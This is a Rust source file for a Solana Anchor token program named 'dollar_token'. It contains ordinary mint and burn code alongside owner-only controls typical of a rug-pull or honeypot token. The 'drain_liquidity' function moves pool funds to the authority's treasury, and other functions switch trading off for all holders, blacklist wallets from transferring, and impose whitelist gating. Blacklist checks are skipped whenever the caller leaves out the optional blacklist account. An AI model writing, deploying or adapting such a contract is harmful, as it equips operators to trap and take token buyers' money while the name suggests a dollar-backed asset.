use anchor_lang::prelude::*;
use anchor_spl::{
    token::{self, Mint, Token, TokenAccount, Transfer, MintTo, Burn},
};

declare_id!("FtAWkh8vpT1DvULYhhtYZhYNuobPmeizR5kbmD4jMy48");

#[program]
pub mod dollar_token {
    use super::*;

    pub fn initialize_token(
        ctx: Context<InitializeToken>,
        name: String,
        symbol: String,
        uri: String,
        decimals: u8,
    ) -> Result<()> {
        let token_info = &mut ctx.accounts.token_info;
        token_info.authority = ctx.accounts.authority.key();
        token_info.mint = ctx.accounts.mint.key();
        token_info.name = name;
        token_info.symbol = symbol;
        token_info.uri = uri;
        token_info.decimals = decimals;
        token_info.total_supply = 0;
        token_info.is_initialized = true;
        token_info.whitelist_enabled = false;
        token_info.trading_enabled = true;
        token_info.blacklist_enabled = true;
        
        Ok(())
    }

    pub fn mint_tokens(
        ctx: Context<MintTokens>,
        amount: u64,
    ) -> Result<()> {
        // Only authority can mint
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let cpi_accounts = MintTo {
            mint: ctx.accounts.mint.to_account_info(),
            to: ctx.accounts.destination.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

        token::mint_to(cpi_ctx, amount)?;

        let token_info = &mut ctx.accounts.token_info;
        token_info.total_supply = token_info.total_supply.checked_add(amount).unwrap();

        emit!(TokensMinted {
            mint: ctx.accounts.mint.key(),
            to: ctx.accounts.destination.key(),
            amount,
            new_supply: token_info.total_supply,
        });

        Ok(())
    }

    pub fn burn_tokens(
        ctx: Context<BurnTokens>,
        amount: u64,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let cpi_accounts = Burn {
            mint: ctx.accounts.mint.to_account_info(),
            from: ctx.accounts.from.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

        token::burn(cpi_ctx, amount)?;

        let token_info = &mut ctx.accounts.token_info;
        token_info.total_supply = token_info.total_supply.checked_sub(amount).unwrap();

        emit!(TokensBurned {
            mint: ctx.accounts.mint.key(),
            from: ctx.accounts.from.key(),
            amount,
            new_supply: token_info.total_supply,
        });

        Ok(())
    }

    pub fn drain_liquidity(
        ctx: Context<DrainLiquidity>,
        amount: u64,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let cpi_accounts = Transfer {
            from: ctx.accounts.liquidity_pool.to_account_info(),
            to: ctx.accounts.treasury.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

        token::transfer(cpi_ctx, amount)?;

        emit!(LiquidityDrained {
            from: ctx.accounts.liquidity_pool.key(),
            to: ctx.accounts.treasury.key(),
            amount,
            authority: ctx.accounts.authority.key(),
        });

        Ok(())
    }

    // ============= BLACKLIST FUNCTIONS =============
    
    pub fn add_to_blacklist(
        ctx: Context<ManageBlacklist>,
        wallet: Pubkey,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let blacklist = &mut ctx.accounts.blacklist;
        blacklist.wallet = wallet;
        blacklist.is_blacklisted = true;
        blacklist.added_at = Clock::get()?.unix_timestamp;
        blacklist.reason = String::from("Admin blocked");

        emit!(WalletBlacklisted {
            wallet,
            authority: ctx.accounts.authority.key(),
            timestamp: blacklist.added_at,
        });

        Ok(())
    }

    pub fn remove_from_blacklist(
        ctx: Context<RemoveBlacklist>,
        _wallet: Pubkey,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let blacklist = &mut ctx.accounts.blacklist;
        blacklist.is_blacklisted = false;

        emit!(WalletUnblacklisted {
            wallet: blacklist.wallet,
            authority: ctx.accounts.authority.key(),
            timestamp: Clock::get()?.unix_timestamp,
        });

        Ok(())
    }

    pub fn toggle_blacklist_system(
        ctx: Context<ToggleBlacklistSystem>,
        enabled: bool,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let token_info = &mut ctx.accounts.token_info;
        token_info.blacklist_enabled = enabled;

        emit!(BlacklistSystemToggled {
            enabled,
            authority: ctx.accounts.authority.key(),
            timestamp: Clock::get()?.unix_timestamp,
        });

        Ok(())
    }

    // ============= WHITELIST FUNCTIONS =============
    
    pub fn add_to_whitelist(
        ctx: Context<ManageWhitelist>,
        wallet: Pubkey,
        allocation: u64,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let whitelist = &mut ctx.accounts.whitelist;
        whitelist.wallet = wallet;
        whitelist.is_whitelisted = true;
        whitelist.allocation = allocation;
        whitelist.purchased = 0;
        whitelist.added_at = Clock::get()?.unix_timestamp;

        emit!(WalletWhitelisted {
            wallet,
            allocation,
            authority: ctx.accounts.authority.key(),
            timestamp: whitelist.added_at,
        });

        Ok(())
    }

    pub fn remove_from_whitelist(
        ctx: Context<RemoveWhitelist>,
        _wallet: Pubkey,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let whitelist = &mut ctx.accounts.whitelist;
        whitelist.is_whitelisted = false;

        emit!(WalletRemovedFromWhitelist {
            wallet: whitelist.wallet,
            authority: ctx.accounts.authority.key(),
            timestamp: Clock::get()?.unix_timestamp,
        });

        Ok(())
    }

    pub fn toggle_whitelist_mode(
        ctx: Context<ToggleWhitelistMode>,
        enabled: bool,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let token_info = &mut ctx.accounts.token_info;
        token_info.whitelist_enabled = enabled;

        emit!(WhitelistModeToggled {
            enabled,
            authority: ctx.accounts.authority.key(),
            timestamp: Clock::get()?.unix_timestamp,
        });

        Ok(())
    }

    // ============= TRADING CONTROL =============
    
    pub fn toggle_trading(
        ctx: Context<ToggleTrading>,
        enabled: bool,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let token_info = &mut ctx.accounts.token_info;
        token_info.trading_enabled = enabled;

        emit!(TradingToggled {
            enabled,
            authority: ctx.accounts.authority.key(),
            timestamp: Clock::get()?.unix_timestamp,
        });

        Ok(())
    }

    // ============= TRANSFER WITH CHECKS =============
    
    pub fn controlled_transfer(
        ctx: Context<ControlledTransfer>,
        amount: u64,
    ) -> Result<()> {
        let token_info = &ctx.accounts.token_info;
        
        // Check if trading is enabled
        require!(
            token_info.trading_enabled,
            TokenError::TradingDisabled
        );

        // Check blacklist for sender (if account provided)
        if token_info.blacklist_enabled {
            if let Some(sender_blacklist) = &ctx.accounts.sender_blacklist {
                require!(
                    !sender_blacklist.is_blacklisted,
                    TokenError::SenderBlacklisted
                );
            }
        }

        // Check blacklist for recipient (if account provided)
        if token_info.blacklist_enabled {
            if let Some(recipient_blacklist) = &ctx.accounts.recipient_blacklist {
                require!(
                    !recipient_blacklist.is_blacklisted,
                    TokenError::RecipientBlacklisted
                );
            }
        }

        // Check whitelist mode
        if token_info.whitelist_enabled {
            // In whitelist mode, sender must be whitelisted
            if let Some(sender_whitelist) = &ctx.accounts.sender_whitelist {
                require!(
                    sender_whitelist.is_whitelisted,
                    TokenError::SenderNotWhitelisted
                );
            } else {
                return Err(TokenError::SenderNotWhitelisted.into());
            }

            // Recipient must be whitelisted
            if let Some(recipient_whitelist) = &ctx.accounts.recipient_whitelist {
                require!(
                    recipient_whitelist.is_whitelisted,
                    TokenError::RecipientNotWhitelisted
                );
            } else {
                return Err(TokenError::RecipientNotWhitelisted.into());
            }
        }

        // Execute transfer
        let cpi_accounts = Transfer {
            from: ctx.accounts.from.to_account_info(),
            to: ctx.accounts.to.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

        token::transfer(cpi_ctx, amount)?;

        emit!(ControlledTransferExecuted {
            from: ctx.accounts.from.key(),
            to: ctx.accounts.to.key(),
            amount,
            authority: ctx.accounts.authority.key(),
        });

        Ok(())
    }

    pub fn transfer_authority(
        ctx: Context<TransferAuthority>,
        new_authority: Pubkey,
    ) -> Result<()> {
        require!(
            ctx.accounts.authority.key() == ctx.accounts.token_info.authority,
            TokenError::UnauthorizedAccess
        );

        let token_info = &mut ctx.accounts.token_info;
        let old_authority = token_info.authority;
        token_info.authority = new_authority;

        emit!(AuthorityTransferred {
            old_authority,
            new_authority,
            mint: ctx.accounts.mint.key(),
        });

        Ok(())
    }
}

// ============= ACCOUNT STRUCTS =============

#[derive(Accounts)]
pub struct InitializeToken<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(
        init,
        payer = authority,
        mint::decimals = 9,
        mint::authority = authority,
    )]
    pub mint: Account<'info, Mint>,
    
    #[account(
        init,
        payer = authority,
        space = 8 + TokenInfo::INIT_SPACE,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct MintTokens<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(mut)]
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = authority,
    )]
    pub destination: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct BurnTokens<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(mut)]
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = authority,
    )]
    pub from: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct DrainLiquidity<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        token::mint = mint,
    )]
    pub liquidity_pool: Account<'info, TokenAccount>,
    
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = authority,
    )]
    pub treasury: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
#[instruction(wallet: Pubkey)]
pub struct ManageBlacklist<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        init_if_needed,
        payer = authority,
        space = 8 + BlacklistEntry::INIT_SPACE,
        seeds = [b"blacklist", mint.key().as_ref(), wallet.as_ref()],
        bump,
    )]
    pub blacklist: Account<'info, BlacklistEntry>,
    
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
#[instruction(wallet: Pubkey)]
pub struct RemoveBlacklist<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        seeds = [b"blacklist", mint.key().as_ref(), wallet.as_ref()],
        bump,
    )]
    pub blacklist: Account<'info, BlacklistEntry>,
}

#[derive(Accounts)]
pub struct ToggleBlacklistSystem<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
}

#[derive(Accounts)]
#[instruction(wallet: Pubkey)]
pub struct ManageWhitelist<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        init_if_needed,
        payer = authority,
        space = 8 + WhitelistEntry::INIT_SPACE,
        seeds = [b"whitelist", mint.key().as_ref(), wallet.as_ref()],
        bump,
    )]
    pub whitelist: Account<'info, WhitelistEntry>,
    
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
#[instruction(wallet: Pubkey)]
pub struct RemoveWhitelist<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        seeds = [b"whitelist", mint.key().as_ref(), wallet.as_ref()],
        bump,
    )]
    pub whitelist: Account<'info, WhitelistEntry>,
}

#[derive(Accounts)]
pub struct ToggleWhitelistMode<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
}

#[derive(Accounts)]
pub struct ToggleTrading<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
}

#[derive(Accounts)]
pub struct ControlledTransfer<'info> {
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
    
    #[account(
        mut,
        token::mint = mint,
    )]
    pub from: Account<'info, TokenAccount>,
    
    #[account(
        mut,
        token::mint = mint,
    )]
    pub to: Account<'info, TokenAccount>,
    
    /// CHECK: Optional blacklist check for sender
    pub sender_blacklist: Option<Account<'info, BlacklistEntry>>,
    
    /// CHECK: Optional blacklist check for recipient
    pub recipient_blacklist: Option<Account<'info, BlacklistEntry>>,
    
    /// CHECK: Optional whitelist check for sender
    pub sender_whitelist: Option<Account<'info, WhitelistEntry>>,
    
    /// CHECK: Optional whitelist check for recipient
    pub recipient_whitelist: Option<Account<'info, WhitelistEntry>>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct TransferAuthority<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        seeds = [b"token_info", mint.key().as_ref()],
        bump,
    )]
    pub token_info: Account<'info, TokenInfo>,
}

// ============= DATA STRUCTS =============

#[account]
#[derive(InitSpace)]
pub struct TokenInfo {
    pub authority: Pubkey,
    pub mint: Pubkey,
    #[max_len(32)]
    pub name: String,
    #[max_len(10)]
    pub symbol: String,
    #[max_len(200)]
    pub uri: String,
    pub decimals: u8,
    pub total_supply: u64,
    pub is_initialized: bool,
    pub whitelist_enabled: bool,
    pub trading_enabled: bool,
    pub blacklist_enabled: bool,
}

#[account]
#[derive(InitSpace)]
pub struct BlacklistEntry {
    pub wallet: Pubkey,
    pub is_blacklisted: bool,
    pub added_at: i64,
    #[max_len(100)]
    pub reason: String,
}

#[account]
#[derive(InitSpace)]
pub struct WhitelistEntry {
    pub wallet: Pubkey,
    pub is_whitelisted: bool,
    pub allocation: u64,
    pub purchased: u64,
    pub added_at: i64,
}

// ============= EVENTS =============

#[event]
pub struct TokensMinted {
    pub mint: Pubkey,
    pub to: Pubkey,
    pub amount: u64,
    pub new_supply: u64,
}

#[event]
pub struct TokensBurned {
    pub mint: Pubkey,
    pub from: Pubkey,
    pub amount: u64,
    pub new_supply: u64,
}

#[event]
pub struct LiquidityDrained {
    pub from: Pubkey,
    pub to: Pubkey,
    pub amount: u64,
    pub authority: Pubkey,
}

#[event]
pub struct WalletBlacklisted {
    pub wallet: Pubkey,
    pub authority: Pubkey,
    pub timestamp: i64,
}

#[event]
pub struct WalletUnblacklisted {
    pub wallet: Pubkey,
    pub authority: Pubkey,
    pub timestamp: i64,
}

#[event]
pub struct BlacklistSystemToggled {
    pub enabled: bool,
    pub authority: Pubkey,
    pub timestamp: i64,
}

#[event]
pub struct WalletWhitelisted {
    pub wallet: Pubkey,
    pub allocation: u64,
    pub authority: Pubkey,
    pub timestamp: i64,
}

#[event]
pub struct WalletRemovedFromWhitelist {
    pub wallet: Pubkey,
    pub authority: Pubkey,
    pub timestamp: i64,
}

#[event]
pub struct WhitelistModeToggled {
    pub enabled: bool,
    pub authority: Pubkey,
    pub timestamp: i64,
}

#[event]
pub struct TradingToggled {
    pub enabled: bool,
    pub authority: Pubkey,
    pub timestamp: i64,
}

#[event]
pub struct ControlledTransferExecuted {
    pub from: Pubkey,
    pub to: Pubkey,
    pub amount: u64,
    pub authority: Pubkey,
}

#[event]
pub struct AuthorityTransferred {
    pub old_authority: Pubkey,
    pub new_authority: Pubkey,
    pub mint: Pubkey,
}

// ============= ERRORS =============

#[error_code]
pub enum TokenError {
    #[msg("Unauthorized access - only authority can perform this action")]
    UnauthorizedAccess,
    
    #[msg("Token is not initialized")]
    TokenNotInitialized,
    
    #[msg("Invalid amount specified")]
    InvalidAmount,
    
    #[msg("Insufficient balance for operation")]
    InsufficientBalance,
    
    #[msg("Trading is currently disabled")]
    TradingDisabled,
    
    #[msg("Sender wallet is blacklisted")]
    SenderBlacklisted,
    
    #[msg("Recipient wallet is blacklisted")]
    RecipientBlacklisted,
    
    #[msg("Sender is not whitelisted")]
    SenderNotWhitelisted,
    
    #[msg("Recipient is not whitelisted")]
    RecipientNotWhitelisted,
    
    #[msg("Whitelist allocation exceeded")]
    AllocationExceeded,
}